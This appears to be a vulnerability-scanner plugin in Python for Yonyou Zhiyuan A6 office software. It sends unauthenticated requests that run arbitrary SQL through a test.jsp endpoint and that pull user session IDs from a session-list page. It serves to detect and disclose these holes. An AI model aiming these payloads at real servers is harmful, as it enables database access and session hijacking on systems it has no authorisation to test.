#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#author:??
#refer:http://www.wooyun.org/bugs/wooyun-2010-0102224
#refer:http://www.wooyun.org/bugs/wooyun-2010-0102452


def assign(service, arg): 
    if service == "yongyou_zhiyuan_a6": 
        return True, arg 

def audit(arg):
    playload1 = '/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20md5(123)'
    url = arg + playload1
    code, head, res, errcode, _ = curl.curl2(url)
    if code ==200 and '202cb962ac59075b964b07152d234b70' in res :
        security_hole(url+'  Any sql statements exection')
    playload2 = '/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
    url = arg + playload2
    code, head, res, errcode, _ = curl.curl2(url)
    if code ==200 and 'sessionID' in res and 'usrID' in res:
        security_hole(url+ ' users information reverl')


if __name__ == '__main__': 
    from dummy import * 
    audit(assign('yongyou_zhiyuan_a6', 'http://www.example.com/')[1])
  